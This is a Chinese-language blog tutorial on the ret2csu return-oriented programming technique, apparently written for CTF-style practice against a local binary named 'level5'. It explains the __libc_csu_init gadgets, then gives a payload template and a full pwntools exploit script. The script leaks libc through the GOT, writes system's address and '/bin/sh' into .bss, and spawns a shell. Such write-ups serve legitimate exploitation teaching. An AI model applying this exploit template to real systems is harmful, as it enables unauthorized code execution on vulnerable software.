# ROP-ret2csu


_libc_csu_init是64位程序几乎必有的一个函数，用来对libc.so进行初始化。该函数会对一些常用的寄存器进行初始化。如下所示：

![image-20231104233639574](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231104233639574.png)

我们就可以通过栈溢出转到这两个gadgets处进行执行，从而利用栈上的数据为寄存器赋值，然后执行目标函数。

这里分析下两个gadgets的流程（按照顺序）：

- 将rsp+8的内容赋值给rbx，这里必须是0，原因在下面
- 将rsp+16的内容赋值给rbp，这里选择1，原因稍后
- rsp+24 -> r12，
- rsp+32 -> r13
- rsp+40 -> r14
- rsp+48 -> r15
- 栈顶下移0x38
- r15 -> rdx
- r14 -> rsi
- r13d -> edi （就是rdi的低位）
- 执行 r12 + rbx*8 位置的指令，因为rbx为0，这里就等于r12指向的地址
- rbx += 1，此时rbx=1
- 为了不进行跳转，这里必须使得rbx==rbp，由于rbx==1，rbp==1，因此两者相等

64位函数调用的参数顺序依次为：rdi,rsi,rdx,rcx,r8,r9,栈，如果要利用csu进行函数调用，栈的布局应该如下所示：

![image.png](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698838923788-6dcca3cf-f276-49e3-91f2-cee3d9c0ee0d.png)

对于ret2csu的payload均按此构造即可。

给出payload模板：

```python
payload1 =  b"\x00"*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8)
payload1 += p64(0x4005F0)
payload1 += b"\x00"*56
payload1 += p64(main)
```

实际上需要更改的只有这个部分：

![image.png](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698909690481-c828080b-1130-403e-a2b6-60e949803bb5.png)

PS：

- padding最好使用\x00，不然会有莫名其妙的问题
- 关闭地址随机化
- 使用system需要将地址写入bss段再进行调用

模板：（第一次payload泄露write地址，从而获得libc偏移；第二次payload向bss写入system addr，第三次payload执行system指令）

```python
from pwn import *

context(arch='amd64',os='linux')

elf = ELF('./level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = elf.process()

main = 0x400564
got_write = elf.got['write']

gadgets1 = 0x400606
gadgets2 = 0x4005f0

payload1 =  b"a"*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8)
payload1 += p64(0x4005F0)
payload1 += b"a"*56
payload1 += p64(main)

r.recvuntil(b'Hello, World\n')
r.send(payload1)

write_addr = u64(r.recvuntil(b'\x7f').ljust(8,b'\x00'))

libc_addr = write_addr - libc.sym['write']
system_addr = libc_addr + libc.sym['system']
got_read = elf.got['read']
bss_addr = 0x601028

payload2 =  b"\x00"*136
payload2 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)
payload2 += p64(0x4005F0) 
payload2 += b"\x00"*56
payload2 += p64(main)

r.recvuntil(b'Hello, World\n')
r.send(payload2)

r.send(p64(system_addr) + b'/bin/sh\0')

payload3 =  b"\x00"*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += b"\x00"*56
payload3 += p64(main)

gdb.attach(r)
r.recvuntil(b'Hello, World\n')
sleep(1)
r.send(payload3)

r.interactive()
```


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/11/rop-ret2csu/  

